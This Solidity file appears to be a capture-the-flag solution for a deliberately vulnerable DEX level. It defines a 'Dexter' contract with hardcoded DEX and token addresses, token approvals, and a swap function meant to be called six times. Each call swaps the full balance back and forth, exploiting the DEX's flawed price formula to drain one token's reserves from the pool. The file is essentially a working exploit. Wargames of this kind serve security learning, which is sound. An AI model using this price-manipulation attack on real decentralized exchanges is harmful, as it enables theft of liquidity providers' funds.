// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Dex{
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function approve(address spender, uint amount) external;
    function balanceOf(address token, address account) external view returns (uint);
    function swap(address from, address to, uint amount) external;
    function setTokens(address _token1, address _token2) external;
    function addLiquidity(address token_address, uint amount) external;
}

interface SwappableToken{
    function approve(address owner, address spender, uint256 amount) external returns(bool);
}

contract Dexter {
    address private _dex = 0x36330070086869f7449646e6c2043C681c504657;
    address private _token1 = 0x91d3dBE43aD8B05BD6c8F24f5e6f985dC8fd0482;
    address private _token2 = 0x5dF8d2DcD38a101bB4Fa1C8a4A186476e320035D;
    uint public token1_balance;
    uint public token2_balance;

    uint public swapcount = 0; //how many times s_swap has been called

    Dex dex =  Dex (_dex);
    SwappableToken Token1 = SwappableToken(_token1);
    SwappableToken Token2 = SwappableToken(_token2);

    //remix: manual approval function 
    function s_approve() public {
       dex.approve(_dex,100);
    }

    //remix: function to add liquidity if you're solving in remix
    function s_addLiquidity() public {
        dex.setTokens(_token1,_token2);
        dex.approve(_dex,100);
        dex.addLiquidity(_token1,100);
        dex.addLiquidity(_token2,100);
    }

    //function to return/update the contract balance of token1 and token2
    function s_balanceOf() public returns (uint,uint) {
        token1_balance = dex.balanceOf(_token1, address(this));
        token2_balance = dex.balanceOf(_token2, address(this));
        return (token1_balance,token2_balance);
    }

    //swap solution, needs to be called 6 times 
    function s_swap() public {
        s_balanceOf();
        if (token1_balance>token2_balance) {
            Token1.approve(address(this),_dex,token1_balance); //allowance changes as you swap things
            if(s_swap_price_token1()>s_DexBalanceToken2()){
              dex.swap(_token1, _token2,s_DexBalanceToken1());
            }
            else {
              dex.swap(_token1, _token2,token1_balance);
            }
        }
        else{
            Token2.approve(address(this),_dex,token2_balance); //allowance changes as you swap things
            if(s_swap_price_token2()>s_DexBalanceToken1()){
              dex.swap(_token2, _token1,s_DexBalanceToken2());
            }
            else {
              dex.swap(_token2, _token1,token2_balance);
            }         
        }
        
        swapcount++;
        s_balanceOf();
    }


    //returns the balance of token1 on the dex trading pair
    function s_DexBalanceToken1() public view returns (uint) {
        return dex.balanceOf(_token1, _dex);
    }
  
    //returns the balance of token2 on the dex trading pair
    function s_DexBalanceToken2() public view returns (uint) {
        return dex.balanceOf(_token2, _dex);
    }

    //returns the s_swap_price_token1 - token1->token2
    function s_swap_price_token1() public view returns (uint){
        return dex.getSwapPrice(_token1, _token2, token1_balance);
    }

    //returns the s_swap_price_token2 - token2->token1
    function s_swap_price_token2() public view returns (uint){
        return dex.getSwapPrice(_token2, _token1,token2_balance);
    }


}